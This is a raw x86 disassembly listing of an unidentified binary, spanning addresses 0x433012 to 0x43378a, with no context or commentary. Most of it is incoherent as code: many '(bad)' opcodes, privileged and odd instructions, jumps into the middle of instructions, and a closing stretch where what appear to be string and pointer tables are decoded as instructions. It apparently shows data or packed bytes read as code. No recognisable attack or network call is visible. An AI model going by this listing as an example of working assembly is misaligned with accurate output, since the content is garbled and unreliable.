  433012:	push   eax
  433013:	dec    eax
  433014:	test   al,0xd0
  433016:	dec    eax
  433018:	mov    eax,DWORD PTR [ebp-0x14]
  43301b:	mov    eax,DWORD PTR [ebp+0x38]
  43301e:	mov    eax,ecx
  433020:	fadd   DWORD PTR [ebx]
  433022:	dec    ebp
  433023:	inc    eax
  433024:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  43302a:	inc    ebp
  43302b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433031:	fadd   QWORD PTR [ebx]
  433033:	inc    ebp
  433034:	or     al,0x33
  433036:	dec    ebp
  433037:	add    edi,DWORD PTR [ebx]
  433039:	mov    DWORD PTR [edx-0x28],esi
  43303c:	mov    eax,DWORD PTR [ebp-0x10]
  43303f:	mov    eax,DWORD PTR [eax+0x10]
  433042:	mov    eax,edi
  433044:	lock ret 
  433046:	inc    ecx
  433047:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43304d:	fsubr  st,st(5)
  43304f:	test   DWORD PTR [eax],eax
  433051:	clc    
  433052:	push   0x45
  433054:	(bad)  
  433055:	cmp    ch,ah
  433057:	pushf  
  433058:	inc    ebp
  433059:	(bad)  
  43305a:	push   eax
  43305b:	fsub   DWORD PTR [eax-0x7b]
  43305e:	(bad)  
  43305f:	clc    
  433060:	mov    eax,0xf8008584
  433065:	mov    eax,DWORD PTR [ebp-0x4]
  433068:	mov    edi,0x4585c3cc
  43306e:	clc    
  43306f:	mov    eax,DWORD PTR [ebp+0x14]
  433072:	cmp    eax,DWORD PTR [ebp-0x64]
  433075:	mov    edi,eax
  433077:	in     al,dx
  433078:	les    esi,FWORD PTR [ebp-0x7b]
  43307b:	mov    edi,eax
  43307d:	or     al,0x4d
  43307f:	dec    ebp
  433080:	mov    eax,ebp
  433082:	in     al,0xf2
  433084:	dec    ebp
  433085:	dec    DWORD PTR [ecx+0x4dc7e045]
  43308b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433091:	inc    ebp
  433092:	mov    DWORD PTR [ebx],esi
  433094:	fadd   QWORD PTR [ebx]
  433096:	dec    ebp
  433097:	push   eax
  433098:	xor    eax,DWORD PTR [ebp+0x3]
  43309b:	push   eax
  43309c:	mov    DWORD PTR [eax+ebx*8],ebx
  43309f:	push   esi
  4330a1:	mov    eax,DWORD PTR [eax]
  4330a3:	lock cmp eax,0xf84e85c0
  4330a9:	inc    ebp
  4330aa:	test   BYTE PTR [ebx],dh
  4330ac:	add    DWORD PTR [ebx],eax
  4330ae:	add    BYTE PTR [eax+0x4d],dl
  4330b1:	jne    0x4330e6
  4330b3:	lea    ecx,[ebx-0x7617fc44]
  4330b9:	div    ah
  4330bb:	inc    DWORD PTR [ebp+0x45]
  4330be:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  4330c4:	jb     0x433051
  4330c6:	add    BYTE PTR [eax*2-0x17ba743f],cl
  4330cd:	mov    ecx,DWORD PTR [ebp-0x10]
  4330d0:	xor    ecx,DWORD PTR [ebp+0x3]
  4330d3:	mov    edi,DWORD PTR [ebx]
  4330d5:	adc    BYTE PTR [ebp+0x41],dh
  4330d8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4330de:	ret    
  4330df:	push   ss
  4330e0:	push   0x45
  4330e2:	lea    ecx,[ebx+0x4de80cb0]
  4330e8:	sti    
  4330e9:	add    edi,edi
  4330eb:	or     BYTE PTR [ebp+0x4d],al
  4330ee:	mov    ebp,DWORD PTR [ebx]
  4330f0:	xor    ebp,ecx
  4330f2:	mov    al,BYTE PTR [edx]
  4330f4:	add    eax,0xc7200
  4330f9:	jne    0x433148
  4330fb:	lea    esi,[ebx]
  4330fd:	mov    al,0xf
  4330ff:	call   0xf27c4
  433104:	shl    DWORD PTR ds:0x89019c84,0x0
  43310b:	rol    BYTE PTR [ebp+0x45],1
  43310e:	mov    esi,DWORD PTR [ebx+esi*1]
  433111:	pushf  
  433112:	mov    al,bh
  433114:	add    eax,0x8572c8
  433119:	clc    
  43311a:	dec    ebp
  43311b:	inc    ebp
  43311c:	xor    edi,DWORD PTR [edx]
  43311e:	setl   al
  433121:	(bad)  
  433122:	retf   
  433123:	rol    cl,1
  433125:	dec    ebp
  433126:	test   BYTE PTR [ebp+0x4d00cc01],cl
  43312c:	inc    ebp
  43312d:	lea    ecx,[ebx-0x75b2cc38]
  433133:	lea    eax,ds:0x4d72c4
  433139:	mov    ecx,DWORD PTR [ebp-0x4]
  43313c:	xor    ecx,edi
  43313e:	bswap  ebx
  433140:	ror    BYTE PTR [ebp-0x35],0xe9
  433144:	rol    DWORD PTR [ecx],0x84
  433147:	add    BYTE PTR [ecx],al
  433149:	cmp    eax,DWORD PTR [eax]
  43314b:	pushf  
  43314c:	inc    ebp
  43314d:	jnp    0x8a436550
  433153:	mov    eax,DWORD PTR ds:0xcf72e8
  433159:	lock dec ebp
  43315b:	retf   
  43315c:	xor    ecx,DWORD PTR [ebp+0xf]
  43315f:	mov    eax,eax
  433161:	fmul   st,st(3)
  433163:	test   ecx,0x19a8484
  433169:	xor    al,BYTE PTR [eax]
  43316b:	mov    DWORD PTR [ebp-0x28],eax
  43316e:	mov    eax,DWORD PTR [ebp+0x33]
  433171:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433177:	ret    
  433178:	add    al,cl
  43317a:	dec    ebp
  43317b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433181:	add    ecx,DWORD PTR ds:0xc7250
  433187:	inc    ebp
  433188:	rcl    DWORD PTR [eax+0x4d],0x2b
  43318c:	mov    edi,edi
  43318e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433194:	jb     0x43315d
  433196:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  43319d:	mov    esi,DWORD PTR [ebx]
  43319f:	cld    
  4331a0:	mov    cl,bh
  4331a2:	or     eax,0x372b6
  4331a7:	cmp    ecx,eax
  4331a9:	jne    0x433226
  4331af:	mov    eax,DWORD PTR [ebp-0x20]
  4331b2:	mov    eax,DWORD PTR [eax]
  4331b4:	xor    eax,edi
  4331b6:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  4331bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4331c0:	mov    ecx,edi
  4331c2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4331c8:	jb     0x4331d9
  4331ca:	add    BYTE PTR [edi-0x3f],dl
  4331cd:	add    BYTE PTR [ebp-0x75],cl
  4331d0:	mov    esi,eax
  4331d2:	xor    eax,DWORD PTR [eax]
  4331d4:	mov    al,bh
  4331d6:	or     eax,0x4a7284
  4331db:	xor    al,cl
  4331dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4331e0:	mov    ecx,edi
  4331e2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4331e8:	jb     0x4331f9
  4331ea:	add    BYTE PTR [edi],dh
  4331ec:	enter  0x8500,0x8b
  4331f0:	add    ah,bl
  4331f2:	add    BYTE PTR [eax],al
  4331f4:	inc    ebp
  4331f5:	(bad)  
  4331f6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  4331fd:	mov    esi,DWORD PTR [edx-0x4]
  433200:	add    bh,cl
  433202:	dec    ebp
  433203:	mov    dh,0x8b
  433205:	add    esi,DWORD PTR [ebx]
  433207:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43320d:	add    BYTE PTR [eax],al
  43320f:	mov    eax,ecx
  433211:	loopne 0x433260
  433213:	add    BYTE PTR [ebx-0x757bcc39],cl
  433219:	dec    edx
  43321a:	or     eax,0x8b7232
  43321f:	in     al,0xc1
  433221:	or     DWORD PTR [ebp-0x31],ecx
  433224:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  43322b:	xor    dh,BYTE PTR [edx-0x75]
  43322e:	add    al,dh
  433230:	enter  0x4f09,0xcf
  433234:	inc    ebp
  433235:	mov    WORD PTR [ebx-0x75cdccb6],cs
  43323b:	or     al,BYTE PTR ds:0xe4728b
  433241:	or     DWORD PTR [ebp-0x31],ecx
  433244:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  43324b:	cmp    dh,BYTE PTR [edx+0xf]
  43324e:	add    bl,dl
  433250:	rol    DWORD PTR [eax],0x4d
  433253:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433259:	(bad)  
  43325a:	or     eax,0x4a7284
  43325f:	xor    al,cl
  433261:	mov    ecx,DWORD PTR [ebp-0x20]
  433264:	mov    ecx,DWORD PTR [ecx]
  433266:	xor    ecx,edi
  433268:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  43326f:	xor    cl,al
  433271:	mov    ecx,DWORD PTR [edi]
  433273:	fadd   QWORD PTR [ebp+0x9]
  433276:	call   0xffd02d4a
  43327b:	dec    edx
  43327c:	dec    ebp
  43327d:	xor    bh,BYTE PTR [ebx]
  43327f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433283:	loopne 0x433281
  433285:	or     edi,eax
  433287:	iret   
  433288:	ret    
  433289:	mov    WORD PTR [ebp+0x4e],es
  43328c:	mov    esi,DWORD PTR [edx]
  43328e:	call   0x8452f9cd
  433293:	(bad)  
  433294:	call   0x8bdc:0x338b3200
  43329b:	add    ah,bh
  43329d:	(bad)  
  43329e:	push   ebp
  43329f:	test   BYTE PTR [ebx],dh
  4332a1:	dec    edx
  4332a2:	add    esi,DWORD PTR [edx]
  4332a4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4332aa:	dec    edi
  4332ac:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4a]
  4332b3:	xor    al,BYTE PTR [ebx]
  4332b5:	mov    edi,DWORD PTR [ebx]
  4332b7:	in     al,0x75
  4332b9:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4332bf:	dec    edx
  4332c0:	xor    esi,DWORD PTR [edx]
  4332c2:	lea    ecx,[edx]
  4332c4:	or     BYTE PTR [ebx+0x900f072],cl
  4332ca:	ja     0x43329b
  4332cc:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b2],cl
  4332d3:	cmp    ch,al
  4332d5:	jne    0x4332ca
  4332d7:	mov    edi,edi
  4332d9:	fadd   QWORD PTR [ebp+0x0]
  4332dc:	mov    eax,edi
  4332de:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb6]
  4332e5:	mov    edx,DWORD PTR [ebx]
  4332e7:	in     al,0x45
  4332e9:	or     DWORD PTR [ebx],esi
  4332eb:	iret   
  4332ec:	add    ecx,DWORD PTR [eax+edx*2+0x4532184a]
  4332f3:	xor    dl,BYTE PTR [eax-0x75]
  4332f6:	sbb    al,0xe0
  4332f8:	dec    DWORD PTR [ecx]
  4332fa:	mov    ecx,edi
  4332fc:	in     al,dx
  4332fd:	mov    eax,es
  4332ff:	dec    edx
  433300:	mov    DWORD PTR [edx],esi
  433302:	fmul   QWORD PTR [edx]
  433304:	jne    0x433291
  433306:	(bad)  
  433307:	(bad)  
  433309:	or     DWORD PTR [ebp-0x31],eax
  43330c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b2]
  433313:	cmp    bh,bh
  433315:	jne    0x43335c
  433317:	lea    ecx,[ebx-0x38372750]
  43331d:	inc    ebx
  43331f:	mov    eax,ecx
  433321:	mov    eax,0xa00c111
  433326:	jne    0x43336d
  433328:	mov    esi,DWORD PTR [ebx]
  43332a:	test   al,0x3
  43332c:	inc    ebp
  43332d:	mov    DWORD PTR [eax-0xc],edx
  433330:	loop   0x433377
  433332:	push   DWORD PTR [ebx]
  433334:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43333a:	add    DWORD PTR [eax],eax
  43333c:	mov    eax,edi
  43333e:	lods   al,BYTE PTR ds:[esi]
  43333f:	dec    ebp
  433340:	inc    ebp
  433341:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433347:	retf   
  433348:	mov    edx,ecx
  43334a:	adc    al,0x84
  43334c:	(bad)  
  43334d:	std    
  43334e:	ret    
  43334f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433355:	hlt    
  433356:	rol    edi,0x82
  433359:	ret    
  43335a:	cld    
  43335b:	enter  0x11ff,0x45
  43335f:	inc    ebp
  433360:	pop    edi
  433361:	mov    ebx,DWORD PTR [ebx+0x14]
  433364:	ret    0xc7
  433367:	test   BYTE PTR [ebx+0x4532519a],cl
  43336d:	jmp    0x4332fa
  43336f:	push   0x8
  433371:	call   DWORD PTR [esi]
  433373:	in     al,dx
  433374:	add    BYTE PTR [ebp+0x1],0x50
  433378:	add    bh,ah
  43337a:	add    bh,bh
  43337c:	icebp  
  43337d:	mov    ecx,DWORD PTR [eax]
  43337f:	cld    
  433380:	pop    es
  433381:	dec    ebp
  433382:	shl    DWORD PTR [ebx],0x72
  433385:	add    eax,DWORD PTR [eax]
  433387:	cmp    edx,ecx
  433389:	je     0x43339b
  43338b:	mov    esi,DWORD PTR [ebp-0x4]
  43338e:	inc    edi
  433390:	or     al,0xc3
  433392:	jmp    FWORD PTR [edx-0x18]
  433395:	(bad)  
  433396:	sti    
  433397:	cwde   
  433398:	(bad)  
  433399:	call   0xffa12ca4
  43339e:	or     al,0x45
  4333a0:	push   ebp
  4333a1:	sub    esp,0x18
  4333a4:	push   ebx
  4333a5:	inc    ebp
  4333a6:	mov    edi,edi
  4333a8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4333af:	test   al,0x53
  4333b1:	inc    ebp
  4333b2:	push   ecx
  4333b3:	push   eax
  4333b4:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4333ba:	add    ah,bh
  4333bc:	(bad)  
  4333bd:	dec    ebp
  4333be:	add    DWORD PTR [ebx],esi
  4333c0:	inc    ebp
  4333c1:	add    ecx,DWORD PTR [ebx+0x74943b]
  4333c7:	push   0xffffff8b
  4333c9:	dec    DWORD PTR [ebx-0x7fbaeb54]
  4333cf:	add    eax,DWORD PTR [ecx]
  4333d1:	or     BYTE PTR [eax],al
  4333d3:	call   0xff852bd8
  4333d8:	mov    eax,DWORD PTR [ebp+0x14]
  4333db:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4333e1:	inc    ebp
  4333e2:	dec    ecx
  4333e3:	add    ebp,DWORD PTR [edx+0x14]
  4333e6:	push   0x8b3045
  4333eb:	call   0x33ad8160
  4333f0:	inc    DWORD PTR [ebx]
  4333f2:	mov    DWORD PTR [edi],ecx
  4333f4:	mov    eax,ecx
  4333f6:	or     BYTE PTR [ebp-0x3d],cl
  4333f9:	cmp    eax,edi
  4333fb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  433400:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433406:	adc    al,0xc9
  433408:	inc    ebp
  433409:	adc    BYTE PTR [eax+0x55],dl
  43340c:	jne    0x4333fa
  43340e:	call   0xff54339e
  433413:	dec    ebp
  433414:	inc    ebp
  433415:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43341b:	add    BYTE PTR [ebx],bh
  43341d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  433421:	push   ebx
  433422:	or     al,0x51
  433424:	dec    ebp
  433425:	xor    DWORD PTR [ebx],0xf32039a
  43342b:	cmp    eax,DWORD PTR [ebp+0x74]
  43342e:	mov    edi,edi
  433430:	pop    edi
  433431:	adc    BYTE PTR [ebx+0x75],bl
  433434:	ret    0x50
  433437:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43343b:	(bad)  
  43343c:	clc    
  43343d:	mov    esp,ebp
  43343f:	pop    ecx
  433440:	mov    ecx,0xf80085c2
  433445:	mov    ecx,DWORD PTR [ecx+edx*2]
  433448:	push   esi
  433449:	push   esi
  43344a:	(bad)  
  43344b:	lock inc DWORD PTR [ebp+0x44]
  43344f:	mov    edx,DWORD PTR [eax]
  433451:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433455:	or     BYTE PTR [ebx+0x7],dl
  433458:	push   ecx
  433459:	ret    
  43345a:	xor    ebx,DWORD PTR [edx+0x37232be]
  433460:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433466:	or     al,0x80
  433468:	jge    0x43346b
  43346a:	mov    DWORD PTR [eax],eax
  43346c:	and    al,0x8
  43346e:	cmp    DWORD PTR [ebp+0x10],eax
  433471:	mov    edx,DWORD PTR [esi]
  433473:	xchg   esp,eax
  433474:	dec    esp
  433475:	add    BYTE PTR [eax],dl
  433477:	mov    ecx,edx
  433479:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43347d:	dec    ebp
  43347e:	into   
  43347f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433485:	mov    edx,DWORD PTR [eax+0x14]
  433488:	das    
  433489:	add    al,0x45
  43348b:	add    BYTE PTR [ebp+0x0],dh
  43348e:	mov    edi,edi
  433490:	and    al,0x50
  433492:	mov    eax,DWORD PTR [eax]
  433494:	and    al,0xd1
  433496:	xor    eax,DWORD PTR [esi]
  433498:	lea    eax,[ebp+0x8]
  43349b:	xor    esi,DWORD PTR [edx+0x3]
  43349e:	add    BYTE PTR [ecx+0x4510fc44],cl
  4334a4:	cmp    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4334aa:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4334b4:	cmp    bh,bh
  4334b6:	pushf  
  4334b7:	mov    edi,edi
  4334b9:	or     BYTE PTR [esi+ecx*1],cl
  4334bc:	jne    0x433481
  4334be:	call   0xc348a
  4334c3:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4334c7:	mov    ebx,DWORD PTR [eax]
  4334c9:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  4334cd:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4334d5:	pop    esi
  4334d6:	jmp    0x4334a1
  4334d8:	and    al,0x10
  4334da:	and    al,0x55
  4334dc:	or     ah,ch
  4334de:	and    al,0xe4
  4334e0:	inc    DWORD PTR [ebx+0x35e81024]
  4334e6:	(bad)  
  4334e7:	pushf  
  4334e8:	dec    DWORD PTR [ecx+0x570c2444]
  4334ee:	pop    esi
  4334ef:	inc    ecx
  4334f0:	in     eax,0x89
  4334f2:	ret    0x24
  4334f5:	mov    edi,eax
  4334f7:	and    al,0x7d
  4334f9:	mov    edx,0x768089c
  4334fe:	clc    
  4334ff:	cli    
  433500:	call   FWORD PTR [edx+0x3893274]
  433506:	dec    DWORD PTR [ecx-0x74e7db01]
  43350c:	adc    al,0xc
  43350e:	(bad)  
  43350f:	jl     0x433535
  433511:	adc    al,0x8b
  433513:	dec    ebp
  433514:	or     al,0x75
  433516:	jmp    0x4334a3
  433518:	adc    BYTE PTR [esp+eax*2],ah
  43351b:	xor    ecx,DWORD PTR [ebx+ecx*4-0x3e]
  43351f:	and    al,0x9a
  433521:	add    ecx,DWORD PTR [ecx+0xeca680f]
  433527:	dec    esp
  433528:	jne    0x433532
  43352a:	jne    0x433565
  43352c:	call   FWORD PTR [ecx*4-0x74ef8bf8]
  433533:	test   BYTE PTR [ebp+0x32],bl
  433536:	and    al,0x85
  433538:	cmp    eax,DWORD PTR [ebp-0x408bdbf8]
  43353e:	pop    edi
  43353f:	(bad)  
  433540:	sbb    edx,DWORD PTR [eax]
  433542:	add    dl,dl
  433544:	cmp    edx,DWORD PTR [eax]
  433546:	add    BYTE PTR [esi+0x7e],al
  433549:	adc    BYTE PTR [eax],al
  43354b:	mov    eax,ds:0x1c00107e
  433550:	push   edx
  433551:	adc    BYTE PTR [eax],al
  433553:	cli    
  433554:	push   ss
  433555:	adc    BYTE PTR [eax],al
  433557:	lahf   
  433558:	adc    edx,DWORD PTR [eax]
  43355a:	add    BYTE PTR [eax+eiz*2+0x10],ah
  43355e:	add    BYTE PTR [edi+0x19001004],ah
  433564:	inc    eax
  433565:	adc    BYTE PTR [eax],al
  433567:	ds jge 0x43357a
  43356a:	add    BYTE PTR [edi],bh
  43356c:	xor    eax,0x35430043
  433571:	inc    ebx
  433572:	add    BYTE PTR [edi+0x35],al
  433575:	inc    ebx
  433576:	add    BYTE PTR [ebx+0x35],cl
  433579:	inc    ebx
  43357a:	add    BYTE PTR [edi+0x35],cl
  43357d:	inc    ebx
  43357e:	add    BYTE PTR [ebx+0x35],dl
  433581:	inc    ebx
  433582:	add    BYTE PTR [edi+0x35],dl
  433585:	inc    ebx
  433586:	add    BYTE PTR [ebx+0x35],bl
  433589:	inc    ebx
  43358a:	add    BYTE PTR [edi+0x35],bl
  43358d:	inc    ebx
  43358e:	add    BYTE PTR [ebx+0x35],ah
  433591:	inc    ebx
  433592:	add    BYTE PTR [edi+0x35],ah
  433595:	inc    ebx
  433596:	add    BYTE PTR [ecx],ah
  433598:	jno    0x4335aa
  43359a:	add    BYTE PTR [esi+ebp*2+0x6dca0010],ah
  4335a1:	adc    BYTE PTR [eax],al
  4335a3:	ja     0x433615
  4335a5:	adc    BYTE PTR [eax],al
  4335a7:	xor    BYTE PTR [edx+0x10],0x0
  4335ab:	loopne 0x43361b
  4335ad:	adc    BYTE PTR [eax],al
  4335af:	cmp    BYTE PTR [eax+0x10],dl
  4335b2:	add    BYTE PTR ds:0x9700104f,al
  4335b8:	xor    eax,0x359b0043
  4335bd:	inc    ebx
  4335be:	add    BYTE PTR [edi-0x5cffbccb],bl
  4335c4:	xor    eax,0x35a70043
  4335c9:	inc    ebx
  4335ca:	add    BYTE PTR [ebx-0x50ffbccb],ch
  4335d0:	xor    eax,0x35b30043
  4335d5:	inc    ebx
  4335d6:	add    BYTE PTR [ecx],al
  4335d8:	add    BYTE PTR [eax],dl
  4335da:	add    al,ah
  4335dc:	pop    ebp
  4335dd:	adc    BYTE PTR [eax],al
  4335df:	add    ah,BYTE PTR ds:0x328d0010
  4335e5:	adc    BYTE PTR [eax],al
  4335e7:	xchg   DWORD PTR [ecx],edx
  4335e9:	adc    BYTE PTR [eax],al
  4335eb:	ja     0x4335f9
  4335ed:	adc    BYTE PTR [eax],al
  4335ef:	add    cl,BYTE PTR [eax]
  4335f1:	adc    BYTE PTR [eax],al
  4335f3:	jle    0x433669
  4335f5:	adc    BYTE PTR [eax],al
  4335f7:	xlat   BYTE PTR ds:[ebx]
  4335f8:	xor    eax,0x35db0043
  4335fd:	inc    ebx
  4335fe:	add    bh,bl
  433600:	xor    eax,0x35e30043
  433605:	inc    ebx
  433606:	add    bh,ah
  433608:	xor    eax,0x35eb0043
  43360d:	inc    ebx
  43360e:	add    bh,ch
  433610:	xor    eax,0x35f30043
  433615:	inc    ebx
  433616:	add    BYTE PTR [esi+0x12],bl
  433619:	adc    BYTE PTR [eax],al
  43361b:	stc    
  43361c:	push   es
  43361d:	adc    BYTE PTR [eax],al
  43361f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433620:	xor    DWORD PTR [eax],edx
  433622:	add    BYTE PTR [eax+0x7b],dl
  433625:	adc    BYTE PTR [eax],al
  433627:	stos   DWORD PTR es:[edi],eax
  433628:	push   edi
  433629:	adc    BYTE PTR [eax],al
  43362b:	inc    ebp
  43362c:	adc    edx,DWORD PTR [eax]
  43362e:	add    BYTE PTR [eax+0x38],ch
  433631:	adc    BYTE PTR [eax],al
  433633:	pop    ecx
  433634:	and    edx,DWORD PTR [eax]
  433636:	add    BYTE PTR [edi],dl
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [ebx],bl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [edi],bl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [ebx],ah
  433644:	ss inc ebx
  433646:	add    BYTE PTR [edi],ah
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [ebx],ch
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [edi],ch
  433650:	ss inc ebx
  433652:	add    BYTE PTR [ebx],dh
  433654:	ss inc ebx
  433656:	add    BYTE PTR [ecx+0x72],cl
  433659:	adc    BYTE PTR [eax],al
  43365b:	cmp    edi,DWORD PTR [eax+0x10]
  43365e:	add    BYTE PTR [ebx+0x23],dl
  433661:	adc    BYTE PTR [eax],al
  433663:	jno    0x4336d1
  433665:	adc    BYTE PTR [eax],al
  433667:	pop    eax
  433668:	outs   dx,BYTE PTR ds:[esi]
  433669:	adc    BYTE PTR [eax],al
  43366b:	mov    ebx,DWORD PTR [ebx+0x10]
  43366e:	add    BYTE PTR [ebx+ebx*2],ch
  433671:	adc    BYTE PTR [eax],al
  433673:	retf   0x1066
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    BYTE PTR [ebx+0x36],dh
  433695:	inc    ebx
  433696:	add    BYTE PTR [ebx+0x32],al
  433699:	xor    dh,BYTE PTR ds:0x5a52345f
  43369f:	push   esp
  4336a0:	xor    BYTE PTR [esi],dh
  4336a2:	add    BYTE PTR [ecx+0x36],cl
  4336a5:	push   eax
  4336a6:	pop    edi
  4336a7:	ss inc ebx
  4336a9:	ss pop edx
  4336ab:	xor    ebx,DWORD PTR [edi+0x52]
  4336ae:	add    BYTE PTR [edi+ecx*2+0x32],dl
  4336b2:	pop    edi
  4336b3:	dec    esi
  4336b4:	dec    esp
  4336b5:	dec    eax
  4336b6:	xor    esi,DWORD PTR [edx]
  4336b8:	pop    edi
  4336b9:	xor    al,0x4b
  4336bb:	add    BYTE PTR [eax+0x49],cl
  4336be:	push   ebp
  4336bf:	xor    al,0x5f
  4336c1:	dec    esp
  4336c2:	inc    edx
  4336c3:	dec    ecx
  4336c4:	cmp    DWORD PTR [edi+ebx*2],esi
  4336c7:	pop    ecx
  4336c8:	inc    edi
  4336c9:	add    BYTE PTR [eax+0x50],bl
  4336cc:	dec    eax
  4336cd:	pop    edi
  4336ce:	push   ebp
  4336cf:	push   ecx
  4336d0:	inc    edi
  4336d1:	xor    cl,BYTE PTR [edx+0x38]
  4336d4:	push   esi
  4336d5:	add    BYTE PTR [ebx+0x4a],al
  4336d8:	push   edx
  4336d9:	pop    edi
  4336da:	dec    edi
  4336db:	dec    eax
  4336dc:	dec    edi
  4336dd:	dec    edi
  4336de:	dec    edx
  4336df:	add    BYTE PTR [ecx+0x52],al
  4336e2:	cmp    DWORD PTR [edi+0x56],ebx
  4336e5:	aaa    
  4336e6:	dec    esp
  4336e7:	cmp    DWORD PTR [ebx+0x5f],eax
  4336ea:	push   edx
  4336eb:	inc    esp
  4336ec:	add    BYTE PTR [ecx+0x37],bl
  4336ef:	inc    esp
  4336f0:	pop    edi
  4336f1:	dec    ecx
  4336f2:	xor    esi,DWORD PTR [edi]
  4336f4:	xor    DWORD PTR [edi+0x49],ebx
  4336f7:	push   esp
  4336f8:	xor    eax,DWORD PTR [eax]
  4336fa:	push   edx
  4336fb:	xor    BYTE PTR [eax+0x5f],bl
  4336fe:	dec    eax
  4336ff:	push   edi
  433700:	inc    esi
  433701:	xor    DWORD PTR [edi+0x5f],edx
  433704:	cmp    BYTE PTR [ebx+0x37],dl
  433707:	add    BYTE PTR [esi+0x42],dl
  43370a:	dec    ecx
  43370b:	xor    ebx,DWORD PTR [edi+0x45]
  43370e:	xor    BYTE PTR [ebp+0x5f],cl
  433711:	xor    al,0x34
  433713:	xor    BYTE PTR [edx+0x5f],cl
  433716:	inc    edi
  433717:	add    BYTE PTR [edx+0x57],dl
  43371a:	xor    ebx,DWORD PTR [edi+0x31]
  43371d:	dec    edx
  43371e:	push   edi
  43371f:	xor    eax,0x4d435f
  433724:	dec    ecx
  433725:	xor    eax,0x36365f39
  43372a:	dec    eax
  43372b:	xor    BYTE PTR [eax],al
  43372d:	dec    edi
  43372e:	inc    ebx
  43372f:	push   edi
  433730:	pop    edi
  433731:	inc    edi
  433732:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  433737:	add    BYTE PTR [edx+0x58],al
  43373a:	inc    edi
  43373b:	ss pop edi
  43373d:	push   esi
  43373e:	inc    ebx
  43373f:	dec    esi
  433740:	inc    esp
  433741:	add    BYTE PTR [edi+0x4d],cl
  433744:	inc    edi
  433745:	xor    ebx,DWORD PTR [edi+0x34]
  433748:	dec    esi
  433749:	pop    edx
  43374a:	cmp    BYTE PTR [edi+0x58],bl
  43374d:	cmp    BYTE PTR [eax],al
  43374f:	push   edx
  433750:	pop    eax
  433751:	push   ecx
  433752:	pop    edi
  433753:	dec    esp
  433754:	push   edx
  433755:	dec    ecx
  433756:	dec    edi
  433757:	inc    esp
  433758:	pop    edi
  433759:	dec    edi
  43375a:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43375e:	push   eax
  43375f:	inc    ebp
  433760:	pop    edi
  433761:	xor    eax,0x565f3945
  433766:	add    BYTE PTR [edi+0x4e],al
  433769:	push   esi
  43376a:	pop    edi
  43376b:	inc    edi
  43376c:	push   esp
  43376d:	dec    eax
  43376e:	xor    dh,BYTE PTR [ecx]
  433770:	pop    edi
  433771:	dec    edi
  433772:	xor    eax,DWORD PTR ss:[eax]
  433775:	inc    esp
  433776:	inc    ebp
  433777:	dec    ecx
  433778:	pop    edi
  433779:	push   edx
  43377a:	dec    eax
  43377b:	xor    al,0x48
  43377d:	dec    ecx
  43377e:	ss pop edi
  433780:	aaa    
  433781:	aaa    
  433782:	dec    ecx
  433783:	dec    ebp
  433784:	add    BYTE PTR [eax+0x54],cl
  433787:	ss pop edi
  433789:	inc    esi
  43378a:	inc    edx
